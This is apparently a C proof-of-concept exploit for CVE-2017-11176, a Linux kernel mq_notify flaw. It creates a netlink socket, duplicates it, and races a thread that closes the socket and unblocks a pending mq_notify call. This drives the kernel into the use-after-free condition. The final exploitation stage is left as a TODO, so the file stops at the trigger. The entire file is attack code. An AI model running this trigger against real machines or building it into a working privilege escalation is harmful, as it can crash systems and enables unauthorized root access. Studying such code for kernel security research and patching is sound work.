#define _GNU_SOURCE
#include <mqueue.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(socket, level, opt_name, opt_val, opt_len) syscall(__NR_setsockopt, socket, level, opt_name, opt_val, opt_len)
#define _close(fd) syscall(__NR_close, fd)
#define _dup(fd) syscall(__NR_dup, fd)

#define NOTIFY_COOKIE_LEN (32)
#define SOL_NETLINK	270

struct unblock_thread_arg
{
	int sock_fd;
	int unblock_fd;
	bool is_ready;
};

static void* unblock_thread(void* arg)
{
	struct unblock_thread_arg *uta = (struct unblock_thread_arg*) arg;
	int val = 7777;

	uta->is_ready = true;
	sleep(5);

	printf("[unblock] closing %d fd\n", uta->sock_fd);
	_close(uta->sock_fd);

	printf("[unblock] unblocking now\n");
	if(_setsockopt(uta->unblock_fd, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
	{
		perror("setsockopt");
	}
	
	return NULL;
}

int main(void)
{
	struct sigevent sigev;
	char sival_buffer[NOTIFY_COOKIE_LEN];
	int sock_fd;
	pthread_t tid;
	struct unblock_thread_arg uta;
	
	printf("-={ CVE-2017-11176 Exploit }=-\n");
	
	// initialize the netlink socket 
	if((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) < 0)
	{
		perror("socket");
		goto fail;
	}
	printf("netlink socket created = %d\n", sock_fd);
	
	
	// initialize the sigevent structure 
	memset(&sigev, 0, sizeof(sigev));
	sigev.sigev_notify = SIGEV_THREAD;
	sigev.sigev_value.sival_ptr = sival_buffer;
	sigev.sigev_signo = sock_fd;
	printf("sigev = 0x%p\n", &sigev);

	// initialize the unblock thread arguments
	memset(&uta, 0, sizeof(uta));
	uta.sock_fd = sock_fd;
	uta.is_ready = false;

	// set unblock fd with dup()
	if((uta.unblock_fd = _dup(uta.sock_fd)) < 0)
	{
		perror("dup");
		goto fail;
	}

	// launch!!!
	printf("creating unblock thread....\n");
	if((errno = pthread_create(&tid, NULL, unblock_thread, &uta)) != 0)
	{
		perror("pthread_create");
		goto fail;
	}
	
	// spinlock 
	while(uta.is_ready == false)
		;
	printf("unblocking thread has been created!\n");

	printf("get ready to block\n");
	if(_mq_notify((mqd_t)-1, &sigev))
	{
		perror("mq_notify");
		goto fail;
	}
	printf("mq_notify succeed\n");

	// TODO: exploit

	return 0;

fail:
	printf("exploit failed!\n");
	return -1;
}
